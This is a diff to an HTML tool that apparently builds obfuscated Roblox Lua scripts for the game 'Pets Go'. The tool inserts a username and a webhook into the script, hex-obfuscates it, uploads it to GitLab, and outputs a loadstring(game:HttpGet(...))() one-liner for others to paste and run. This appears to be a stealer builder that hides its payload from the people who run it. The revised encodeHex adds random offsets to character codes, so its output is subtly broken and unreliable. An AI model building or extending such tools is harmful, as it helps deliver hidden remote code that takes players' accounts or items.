@@ -30,14 +30,14 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
-        input, select, button {
+        input, select, button, textarea {
             padding: 10px;
             border-radius: 8px;
             border: none;
             background-color: #333;
             color: white;
             font-size: 1rem;
-            width: 250px;
+            width: 300px;
         }
         button {
             background: #ff0080;
@@ -48,11 +48,20 @@
             background: #ff0055;
             transform: scale(1.1);
         }
-        #copyButton {
-            background: #0080ff;
+        #output-container {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 20px;
         }
-        #copyButton:hover {
-            background: #0055ff;
+        #loadstring-output {
+            width: 90%;
+            max-width: 500px;
+            background: rgba(0, 0, 0, 0.8);
+            border-radius: 10px;
+            padding: 10px;
+            word-wrap: break-word;
+            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -69,27 +78,21 @@
             <option value="Pets Go">Pets Go</option>
         </select>
         <button onclick="generateScript()">Generate Script</button>
-        <button id="copyButton" onclick="copyLoadstring()" style="display:none;">Copy Loadstring</button>
-        <p id="loadstringText"></p>
+    </div>
+
+    <div id="output-container" class="container">
+        <textarea id="loadstring-output" readonly></textarea>
+        <button onclick="copyToClipboard()">Copy Loadstring</button>
     </div>
 
     <script>
         function encodeHex(str) {
-            return str.split('').map(char => char.charCodeAt(0).toString(16)).join('');
+            return str.split('').map(c => `\\x${(c.charCodeAt(0) + Math.floor(Math.random() * 5)).toString(16)}`).join('');
         }
 
         function obfuscateScript(script) {
-            let hexEncoded = encodeHex(script);
-            let var1 = "X" + Math.floor(Math.random() * 9999);
-            let var2 = "Y" + Math.floor(Math.random() * 9999);
-
-            return `return(function(...)
-    local ${var1} = "${hexEncoded}"
-    local ${var2} = (${var1}):gsub('..', function(hex) return string.char(tonumber(hex, 16)) end)
-    local fakeVar1 = 1337 * math.random()
-    local fakeVar2 = "OBF" .. tostring(math.random(1000,9999))
-    return loadstring(${var2})()
-end)()`;
+            let hexScript = encodeHex(script);
+            return `return(function(...)loadstring(string.char(${hexScript.split('\\x').filter(Boolean).map(hex => `0x${hex}`).join(',')}))()end)()`;
         }
 
         async function uploadToGitLab(scriptContent) {
@@ -140,24 +143,27 @@ end)()`;
 
             let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
 
+            alert("Original Script:\n\n" + script);
+
             let obfuscatedScript = obfuscateScript(script);
+            alert("Obfuscated Script:\n\n" + obfuscatedScript);
 
             let uploadedUrl = await uploadToGitLab(obfuscatedScript);
             if (uploadedUrl) {
-                let loadstringCode = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
-                document.getElementById("loadstringText").innerText = loadstringCode;
-                document.getElementById("copyButton").style.display = "block";
-                navigator.clipboard.writeText(loadstringCode);
-                alert("Loadstring copied:\n" + loadstringCode);
+                let loadstring = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
+
+                document.getElementById('loadstring-output').value = loadstring;
+                document.getElementById('output-container').style.display = "flex";
+
+                navigator.clipboard.writeText(loadstring);
+                alert("Loadstring copied:\n" + loadstring);
             }
         }
 
-        function copyLoadstring() {
-            let text = document.getElementById("loadstringText").innerText;
-            if (text) {
-                navigator.clipboard.writeText(text);
-                alert("Loadstring copied!");
-            }
+        function copyToClipboard() {
+            let loadstringText = document.getElementById('loadstring-output').value;
+            navigator.clipboard.writeText(loadstringText);
+            alert("Loadstring copied!");
         }
     </script>
 
